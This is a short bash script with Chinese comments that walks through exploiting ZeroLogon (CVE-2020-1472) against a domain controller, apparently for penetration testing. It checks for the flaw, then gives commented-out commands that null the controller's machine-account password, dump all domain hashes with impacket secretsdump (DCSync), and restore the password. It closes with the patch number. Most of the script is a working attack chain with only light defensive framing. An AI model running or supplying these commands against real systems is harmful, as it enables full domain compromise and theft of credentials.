#!/bin/bash
# ZeroLogon CVE-2020-1472 漏洞利用脚本
# 警告：此漏洞会将域控计算机账户密码置空，可能影响域功能，测试后需立即恢复

DC_HOSTNAME="DC01"
DC_IP="192.168.1.10"
DOMAIN="corp.local"

echo "[*] 第一步：检测目标是否存在 ZeroLogon 漏洞"
python3 zerologon_check.py ${DC_HOSTNAME} ${DC_IP}

echo ""
echo "[*] 第二步：利用漏洞将域控计算机账户密码置空"
echo "    [!] 警告：此操作会影响域功能，测试完成后必须立即恢复密码"
# python3 cve-2020-1472-exploit.py ${DC_HOSTNAME} ${DC_IP}

echo ""
echo "[*] 第三步：使用空密码执行 DCSync 获取域哈希"
# impacket-secretsdump -just-dc -no-pass ${DC_HOSTNAME}\$@${DC_IP}

echo ""
echo "[*] 第四步：恢复域控计算机账户密码（必须执行！）"
# python3 restorepassword.py ${DOMAIN}/${DC_HOSTNAME}@${DC_HOSTNAME} \
#     -target-ip ${DC_IP} \
#     -hexpass <原始密码哈希>

echo ""
echo "[*] 修复方案：安装 KB4571694 或更高版本补丁"
